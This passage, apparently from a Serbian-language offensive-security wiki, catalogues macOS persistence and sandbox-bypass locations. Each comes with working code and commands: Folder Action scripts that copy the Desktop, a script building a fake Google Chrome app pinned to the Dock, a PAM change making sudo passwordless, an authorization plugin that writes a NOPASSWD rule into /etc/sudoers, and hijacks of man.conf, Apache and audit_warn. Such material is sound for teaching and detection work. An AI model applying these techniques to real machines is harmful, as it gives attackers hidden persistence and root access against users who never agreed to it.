{% hint style="warning" %}
Ako zadaci AT nisu omogućeni, kreirani zadaci neće biti izvršeni.
{% endhint %}

**Datoteke poslova** mogu se pronaći na `/private/var/at/jobs/`

```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```

Fajl sadrži red, broj posla i vreme kada je zakazan da se pokrene. Na primer, pogledajmo `a0001a019bdcd2`.

* `a` - ovo je red
* `0001a` - broj posla u heksadecimalnom formatu, `0x1a = 26`
* `019bdcd2` - vreme u heksadecimalnom formatu. Predstavlja minute koje su prošle od epohe. `0x019bdcd2` je `26991826` u decimalnom formatu. Ako ga pomnožimo sa 60 dobijamo `1619509560`, što je `GMT: 2021. April 27., utorak 7:46:00`.

Ako odštampamo fajl posla, otkrivamo da sadrži iste informacije koje smo dobili koristeći `at -c`.

### Akcije fascikle

Analiza: [https://theevilbit.github.io/beyond/beyond\_0024/](https://theevilbit.github.io/beyond/beyond\_0024/)\
Analiza: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

* Korisno za zaobilaženje peska: [✅](https://emojipedia.org/check-mark-button)
* Ali morate moći da pozovete `osascript` sa argumentima da biste kontaktirali **`System Events`** kako biste mogli konfigurisati Akcije fascikle
* TCC zaobilaženje: [🟠](https://emojipedia.org/large-orange-circle)
* Ima neka osnovna TCC odobrenja poput Desktopa, Dokumenata i Preuzimanja

#### Lokacija

* **`/Library/Scripts/Folder Action Scripts`**
* Potreban je root
* **Okidač**: Pristup određenoj fascikli
* **`~/Library/Scripts/Folder Action Scripts`**
* **Okidač**: Pristup određenoj fascikli

#### Opis & Eksploatacija

Akcije fascikle su skripte automatski pokrenute promenama u fascikli poput dodavanja, uklanjanja stavki ili drugih akcija poput otvaranja ili promene veličine prozora fascikle. Ove akcije mogu se koristiti za različite zadatke i mogu se pokrenuti na različite načine poput korišćenja Finder UI-a ili terminalskih komandi.

Za postavljanje Akcija fascikle, imate opcije kao što su:

1. Kreiranje radnog toka Akcije fascikle sa [Automatorom](https://support.apple.com/guide/automator/welcome/mac) i instaliranje kao servisa.
2. Povezivanje skripte ručno putem Postavke Akcija fascikle u kontekstualnom meniju fascikle.
3. Korišćenje OSAScripta za slanje Apple Event poruka aplikaciji `System Events.app` radi programskog postavljanja Akcije fascikle.

* Ovaj metod je posebno koristan za ugradnju akcije u sistem, nudeći nivo postojanosti.

Naredni skript je primer onoga što može biti izvršeno putem Akcije fascikle:

```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```

Da biste napravili gore navedeni skript upotrebljivim za Akcije fascikle, kompajlirajte ga koristeći:

```bash
osacompile -l JavaScript -o folder.scpt source.js
```

Nakon što je skripta kompajlirana, postavite Folder Actions izvršavanjem sledeće skripte. Ova skripta će omogućiti Folder Actions globalno i posebno će prikačiti prethodno kompajliranu skriptu na Desktop folder.

```javascript
// Enabling and attaching Folder Action
var se = Application("System Events");
se.folderActionsEnabled = true;
var myScript = se.Script({name: "source.js", posixPath: "/tmp/source.js"});
var fa = se.FolderAction({name: "Desktop", path: "/Users/username/Desktop"});
se.folderActions.push(fa);
fa.scripts.push(myScript);
```

Pokrenite skriptu podešavanja sa:

```bash
osascript -l JavaScript /Users/username/attach.scpt
```

* Ovo je način da implementirate ovu postojanost putem GUI-ja:

Ovo je skripta koja će biti izvršena:

{% code title="source.js" %}
```applescript
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
{% endcode %}

Kompajlirajte ga sa: `osacompile -l JavaScript -o folder.scpt source.js`

Pomerite ga na:

```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```

Zatim otvorite aplikaciju `Folder Actions Setup`, izaberite **folder koji želite da pratite** i izaberite u vašem slučaju **`folder.scpt`** (u mom slučaju sam ga nazvao output2.scp):

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" width="297"><figcaption></figcaption></figure>

Sada, ako otvorite taj folder sa **Finder**-om, vaš skript će biti izvršen.

Ova konfiguracija je sačuvana u **plist** fajlu koji se nalazi u **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** u base64 formatu.

Sada, hajde da pokušamo da pripremimo ovu postojanost bez pristupa GUI-ju:

1. **Kopirajte `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** u `/tmp` da biste napravili rezervnu kopiju:

* `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`

2. **Uklonite** Folder Actions koje ste upravo postavili:

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Sada kada imamo prazno okruženje

3. Kopirajte rezervni fajl: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Otvorite Folder Actions Setup.app da biste primenili ovu konfiguraciju: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

{% hint style="danger" %}
I ovo nije radilo za mene, ali to su uputstva iz teksta:(
{% endhint %}

### Dock prečice

Tekst: [https://theevilbit.github.io/beyond/beyond\_0027/](https://theevilbit.github.io/beyond/beyond\_0027/)

* Korisno za zaobilaženje peska-boksa: [✅](https://emojipedia.org/check-mark-button)
* Ali morate imati instaliranu zlonamernu aplikaciju unutar sistema
* TCC zaobilaženje: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

* `~/Library/Preferences/com.apple.dock.plist`
* **Okidač**: Kada korisnik klikne na aplikaciju unutar Dock-a

#### Opis & Eksploatacija

Sve aplikacije koje se pojave u Dock-u su navedene unutar plist-a: **`~/Library/Preferences/com.apple.dock.plist`**

Moguće je **dodati aplikaciju** samo sa:

{% code overflow="wrap" %}
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
{% endcode %}

Korišćenjem nekog **socijalnog inženjeringa** mogli biste **npr. da se predstavite kao Google Chrome** unutar dock-a i zapravo izvršite svoj sopstveni skript:

```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```

### Birači boja

Objašnjenje: [https://theevilbit.github.io/beyond/beyond\_0017](https://theevilbit.github.io/beyond/beyond\_0017/)

* Korisno za zaobilaženje peska: [🟠](https://emojipedia.org/large-orange-circle)
* Potrebno je izvršiti vrlo specifičnu radnju
* Završićete u drugom pesku
* TCC zaobilaženje: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

* `/Library/ColorPickers`
* Potreban je root pristup
* Okidač: Korišćenje birača boja
* `~/Library/ColorPickers`
* Okidač: Korišćenje birača boja

#### Opis & Eksploatacija

**Kompajlirajte birač boja** paket sa vašim kodom (možete koristiti [**ovaj na primer**](https://github.com/viktorstrate/color-picker-plus)) i dodajte konstruktor (kao u [odeljku o čuvaru ekrana](macos-auto-start-locations.md#screen-saver)) i kopirajte paket u `~/Library/ColorPickers`.

Zatim, kada se birač boja pokrene, vaš bi trebao takođe.

Imajte na umu da binarni fajl koji učitava vašu biblioteku ima **vrlo restriktivan pesak**: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`

{% code overflow="wrap" %}
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
{% endcode %}

### Finder Sync Dodaci

**Opis**: [https://theevilbit.github.io/beyond/beyond\_0026/](https://theevilbit.github.io/beyond/beyond\_0026/)\
**Opis**: [https://objective-see.org/blog/blog\_0x11.html](https://objective-see.org/blog/blog\_0x11.html)

* Korisno za zaobilaženje peska: **Ne, jer morate izvršiti svoju sopstvenu aplikaciju**
* TCC zaobilaženje: ???

#### Lokacija

* Određena aplikacija

#### Opis & Eksploatacija

Primer aplikacije sa Finder Sync Ekstenzijom [**može se pronaći ovde**](https://github.com/D00MFist/InSync).

Aplikacije mogu imati `Finder Sync Ekstenzije`. Ova ekstenzija će biti smeštena unutar aplikacije koja će biti izvršena. Štaviše, da bi ekstenzija mogla da izvrši svoj kod, **mora biti potpisana** nekim validnim Apple-ovim sertifikatom, mora biti **u pesku** (mada se mogu dodati opuštena izuzetka) i mora biti registrovana sa nečim poput:

```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```

### Screen Saver

Writeup: [https://theevilbit.github.io/beyond/beyond\_0016/](https://theevilbit.github.io/beyond/beyond\_0016/)\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)

* Korisno za zaobilaženje peska: [🟠](https://emojipedia.org/large-orange-circle)
* Ali završićete u zajedničkom aplikacionom pesku
* TCC zaobilaženje: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

* `/System/Library/Screen Savers`
* Potreban je root pristup
* **Okidač**: Izaberite screensaver
* `/Library/Screen Savers`
* Potreban je root pristup
* **Okidač**: Izaberite screensaver
* `~/Library/Screen Savers`
* **Okidač**: Izaberite screensaver

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" width="375"><figcaption></figcaption></figure>

#### Opis & Eksploatacija

Napravite novi projekat u Xcode-u i izaberite šablon za generisanje novog **Screen Saver**-a. Zatim, dodajte svoj kod u njega, na primer sledeći kod za generisanje logova.

**Izgradite** ga, i kopirajte `.saver` paket u **`~/Library/Screen Savers`**. Zatim otvorite GUI Screen Saver-a i ako samo kliknete na njega, trebalo bi da generiše mnogo logova:

{% code overflow="wrap" %}
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
{% endcode %}

{% hint style="danger" %}
Imajte na umu da zato što se unutar dozvola binarnog koda koji učitava ovaj kod (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) možete pronaći **`com.apple.security.app-sandbox`** bićete **unutar zajedničkog aplikacionog peska**.
{% endhint %}

Kod čuvara:

```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```

### Spotlight Dodaci

writeup: [https://theevilbit.github.io/beyond/beyond\_0011/](https://theevilbit.github.io/beyond/beyond\_0011/)

* Korisno za zaobilaženje peska: [🟠](https://emojipedia.org/large-orange-circle)
* Ali ćete završiti u aplikacionom pesku
* TCC zaobilaženje: [🔴](https://emojipedia.org/large-red-circle)
* Pesak izgleda veoma ograničeno

#### Lokacija

* `~/Library/Spotlight/`
* **Okidač**: Kreiran je novi fajl sa ekstenzijom koju upravlja spotlight dodatak.
* `/Library/Spotlight/`
* **Okidač**: Kreiran je novi fajl sa ekstenzijom koju upravlja spotlight dodatak.
* Potreban je root pristup
* `/System/Library/Spotlight/`
* **Okidač**: Kreiran je novi fajl sa ekstenzijom koju upravlja spotlight dodatak.
* Potreban je root pristup
* `Some.app/Contents/Library/Spotlight/`
* **Okidač**: Kreiran je novi fajl sa ekstenzijom koju upravlja spotlight dodatak.
* Potrebna je nova aplikacija

#### Opis & Eksploatacija

Spotlight je ugrađena funkcija pretrage macOS-a, dizajnirana da korisnicima pruži **brz i sveobuhvatan pristup podacima na njihovim računarima**.\
Da bi olakšao ovu brzu mogućnost pretrage, Spotlight održava **vlastitu bazu podataka** i kreira indeks **parsiranjem većine fajlova**, omogućavajući brze pretrage kako kroz nazive fajlova tako i kroz njihov sadržaj.

Osnovni mehanizam Spotlight-a uključuje centralni proces nazvan 'mds', što označava **'metadata server'**. Ovaj proces orkestrira celu Spotlight uslugu. Kao dopuna tome, postoje više 'mdworker' demona koji obavljaju različite održavajuće zadatke, kao što je indeksiranje različitih tipova fajlova (`ps -ef | grep mdworker`). Ovi zadaci su omogućeni putem dodataka za uvoz Spotlight-a, ili **".mdimporter paketi**", koji omogućavaju Spotlight-u da razume i indeksira sadržaj preko raznovrsnog spektra formata fajlova.

Dodaci ili **`.mdimporter`** paketi se nalaze na prethodno pomenutim mestima i ako se pojavi novi paket, učitan je u roku od minuta (nije potrebno ponovno pokretati bilo koju uslugu). Ovi paketi moraju naznačiti koje **tipove fajlova i ekstenzije mogu upravljati**, na ovaj način, Spotlight će ih koristiti kada se kreira novi fajl sa naznačenom ekstenzijom.

Moguće je **pronaći sve `mdimportere`** koji su učitani pokretanjem:

```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```

Na primer, **/Library/Spotlight/iBooksAuthor.mdimporter** se koristi za parsiranje ovih vrsta fajlova (ekstenzije `.iba` i `.book` među ostalima):

```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```

{% hint style="danger" %}
Ako proverite Plist drugog `mdimporter`-a, možda nećete pronaći unos **`UTTypeConformsTo`**. To je zato što je to ugrađeni _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform\_Type\_Identifier)) i ne mora da specificira ekstenzije.

Štaviše, sistemski podrazumevani dodaci uvek imaju prednost, tako da napadač može pristupiti samo datotekama koje nisu indeksirane od strane Apple-ovih `mdimporters`-a.
{% endhint %}

Za kreiranje sopstvenog uvoznika možete početi sa ovim projektom: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) a zatim promeniti ime, **`CFBundleDocumentTypes`** i dodati **`UTImportedTypeDeclarations`** kako bi podržao ekstenziju koju želite da podržite i odraziti ih u **`schema.xml`**.\
Zatim **promenite** kod funkcije **`GetMetadataForFile`** da izvrši vaš payload kada se kreira datoteka sa obrađenom ekstenzijom.

Na kraju **izgradite i kopirajte svoj novi `.mdimporter`** na jedno od prethodnih lokacija i možete proveriti da li je učitan **prateći logove** ili proverom **`mdimport -L.`**

### ~~Preference Pane~~

{% hint style="danger" %}
Izgleda da ovo više ne radi.
{% endhint %}

Analiza: [https://theevilbit.github.io/beyond/beyond\_0009/](https://theevilbit.github.io/beyond/beyond\_0009/)

* Korisno za zaobilaženje peska: [🟠](https://emojipedia.org/large-orange-circle)
* Potrebna je određena korisnička radnja
* TCC zaobilaženje: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

* **`/System/Library/PreferencePanes`**
* **`/Library/PreferencePanes`**
* **`~/Library/PreferencePanes`**

#### Opis

Izgleda da ovo više ne radi.

## Root Sandbox Bypass

{% hint style="success" %}
Ovde možete pronaći startne lokacije korisne za **zaobilaženje peska** koje vam omogućavaju da jednostavno izvršite nešto **upisivanjem u datoteku** kao **root** i/ili zahtevajući druge **čudne uslove.**
{% endhint %}

### Periodično

Analiza: [https://theevilbit.github.io/beyond/beyond\_0019/](https://theevilbit.github.io/beyond/beyond\_0019/)

* Korisno za zaobilaženje peska: [🟠](https://emojipedia.org/large-orange-circle)
* Ali morate biti root
* TCC zaobilaženje: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

* `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
* Potreban je root
* **Okidač**: Kada dođe vreme
* `/etc/daily.local`, `/etc/weekly.local` ili `/etc/monthly.local`
* Potreban je root
* **Okidač**: Kada dođe vreme

#### Opis & Eksploatacija

Periodični skriptovi (**`/etc/periodic`**) se izvršavaju zbog **launch daemona** konfigurisanih u `/System/Library/LaunchDaemons/com.apple.periodic*`. Imajte na umu da skripte smeštene u `/etc/periodic/` se **izvršavaju** kao **vlasnik datoteke,** tako da ovo neće raditi za potencijalno eskalaciju privilegija.

{% code overflow="wrap" %}
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
{% endcode %}

Postoje i drugi periodični skriptovi koji će biti izvršeni, naznačeni u **`/etc/defaults/periodic.conf`**:

```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```

Ako uspete da napišete bilo koji od fajlova `/etc/daily.local`, `/etc/weekly.local` ili `/etc/monthly.local` **biće izvršen ranije ili kasnije**.

{% hint style="warning" %}
Imajte na umu da će periodični skript biti **izvršen kao vlasnik skripte**. Dakle, ako običan korisnik poseduje skriptu, biće izvršena kao taj korisnik (ovo može sprečiti napade eskalacije privilegija).
{% endhint %}

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/linux-post-exploitation/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond\_0005/](https://theevilbit.github.io/beyond/beyond\_0005/)

* Korisno za zaobilaženje peska: [🟠](https://emojipedia.org/large-orange-circle)
* Ali morate biti root
* TCC zaobilaženje: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

* Uvek potreban root

#### Opis & Eksploatacija

Pošto je PAM više fokusiran na **upornost** i malver nego na lako izvršavanje unutar macOS-a, ovaj blog neće pružiti detaljno objašnjenje, **pročitajte writeup-ove da biste bolje razumeli ovu tehniku**.

Proverite PAM module sa:

```bash
ls -l /etc/pam.d
```

### Dodavanje zlonamernog modula PAM-a za održavanje postojanosti/escalaciju privilegija

Tehnika održavanja postojanosti/escalacije privilegija zloupotrebom PAM-a je jednostavna kao što je modifikacija modula /etc/pam.d/sudo dodavanjem na početku linije:

```bash
auth       sufficient     pam_permit.so
```

Dakle, to će **izgledati** nešto ovako:

```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```

I zbog toga će svaki pokušaj korišćenja **`sudo` raditi**.

{% hint style="danger" %}
Imajte na umu da je ovaj direktorijum zaštićen TCC-om, pa je veoma verovatno da će korisnik dobiti upit za pristup.
{% endhint %}

### Plugins za autorizaciju

Objašnjenje: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)\
Objašnjenje: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

* Korisno za zaobilaženje peska: [🟠](https://emojipedia.org/large-orange-circle)
* Ali morate biti root i napraviti dodatne konfiguracije
* TCC zaobilaženje: ???

#### Lokacija

* `/Library/Security/SecurityAgentPlugins/`
* Potreban je root
* Takođe je potrebno konfigurisati bazu podataka za autorizaciju da koristi plugin

#### Opis & Eksploatacija

Možete kreirati plugin za autorizaciju koji će se izvršiti kada se korisnik prijavi kako bi održao postojanost. Za više informacija o tome kako kreirati jedan od ovih pluginova, pogledajte prethodna objašnjenja (i budite oprezni, loše napisan može vas zaključati i moraćete očistiti svoj Mac iz režima oporavka).

```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```

**Pomerite** paket na lokaciju sa koje će se učitati:

```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```

Konačno dodajte **pravilo** za učitavanje ovog dodatka:

```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```

**`evaluate-mechanisms`** će reći okviru autorizacije da će mu biti potrebno **pozvati spoljni mehanizam za autorizaciju**. Štaviše, **`privileged`** će ga učiniti izvršnim od strane root korisnika.

Pokrenite ga sa:

```bash
security authorize com.asdf.asdf
```

### Man.conf

Writeup: [https://theevilbit.github.io/beyond/beyond\_0030/](https://theevilbit.github.io/beyond/beyond\_0030/)

* Korisno za zaobilaženje peska: [🟠](https://emojipedia.org/large-orange-circle)
* Ali morate biti root i korisnik mora koristiti man
* TCC zaobilaženje: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

* **`/private/etc/man.conf`**
* Potreban je root
* **`/private/etc/man.conf`**: Svaki put kada se koristi man

#### Opis & Eksploatacija

Konfiguracioni fajl **`/private/etc/man.conf`** pokazuje binarni/skriptu koju treba koristiti prilikom otvaranja fajlova sa man dokumentacijom. Dakle, putanja do izvršne datoteke može biti izmenjena tako da svaki put kada korisnik koristi man za čitanje neke dokumentacije, izvrši se zadnja vrata.

Na primer, postavite u **`/private/etc/man.conf`**:

```
MANPAGER /tmp/view
```

I zatim kreiraj `/tmp/view` kao:

```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```

### Apache2

**Opis**: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)

* Korisno za zaobilaženje peska: [🟠](https://emojipedia.org/large-orange-circle)
* Ali morate biti root i apache mora biti pokrenut
* TCC zaobilaženje: [🔴](https://emojipedia.org/large-red-circle)
* Httpd nema ovlašćenja

#### Lokacija

* **`/etc/apache2/httpd.conf`**
* Potreban je root pristup
* Okidač: Kada se pokrene Apache2

#### Opis & Eksploatacija

Možete naznačiti u `/etc/apache2/httpd.conf` da učita modul dodavanjem linije poput:

{% code overflow="wrap" %}
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
{% endcode %}

Na ovaj način će vaši kompajlirani moduli biti učitani od strane Apache servera. Jedina stvar je da ili morate **potpisati ga važećim Apple sertifikatom**, ili morate **dodati novi pouzdani sertifikat** u sistem i **potpisati ga** sa njim.

Zatim, ako je potrebno, da biste bili sigurni da će server biti pokrenut, možete izvršiti:

```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```

Primer koda za Dylb:

```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```

### BSM audit framework

Writeup: [https://theevilbit.github.io/beyond/beyond\_0031/](https://theevilbit.github.io/beyond/beyond\_0031/)

* Korisno za zaobilaženje peska: [🟠](https://emojipedia.org/large-orange-circle)
* Ali morate biti root, auditd mora biti pokrenut i izazvati upozorenje
* TCC zaobilaženje: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

* **`/etc/security/audit_warn`**
* Potreban je root pristup
* **Okidač**: Kada auditd otkrije upozorenje

#### Opis & Eksploatacija

Svaki put kada auditd otkrije upozorenje, skripta **`/etc/security/audit_warn`** se **izvršava**. Dakle, možete dodati svoj payload na nju.

```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```

### Lokacije automatskog pokretanja

{% hint style="danger" %}
**Ovo je zastarelo, tako da ništa ne bi trebalo da se pronađe u tim direktorijumima.**
{% endhint %}

